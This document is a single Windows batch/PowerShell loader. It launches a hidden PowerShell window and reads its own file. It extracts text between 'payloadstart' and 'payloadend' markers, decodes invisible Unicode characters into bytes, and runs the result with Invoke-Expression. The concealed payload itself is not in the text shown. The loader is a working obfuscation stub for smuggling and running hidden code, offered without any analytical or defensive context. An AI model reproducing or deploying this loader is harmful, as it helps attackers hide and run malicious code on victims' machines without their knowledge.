powershell -NoProfile -WindowStyle Hidden -Command ^
"`n$f = Get-Content -Raw "%~f0" | Select-String -Pattern "payloadstart" -SimpleMatch`n$encoded = $f.ToString().Split("payloadstart")[1].Split("payloadend")[0]`n`n$chars = @("⁪","⁬","⁮","⁭")`n$bits = ""`nforeach ($c in $encoded.ToCharArray()) {`n    $idx = $chars.IndexOf($c)`n    if ($idx -ge 0) {`n        $bits += [Convert]::ToString($idx,2).PadLeft(2,'0')`n    }`n}`n$bytes = @()`nfor ($i=0; $i -lt $bits.Length; $i+=8) {`n    if ($i+8 -le $bits.Length) {`n        $b = $bits.Substring($i,8)`n        $bytes += [Convert]::ToByte($b,2)`n    }`n}`n$decoded = [System.Text.Encoding]::UTF8.GetString($bytes)`nInvoke-Expression $decoded`nexit`n"

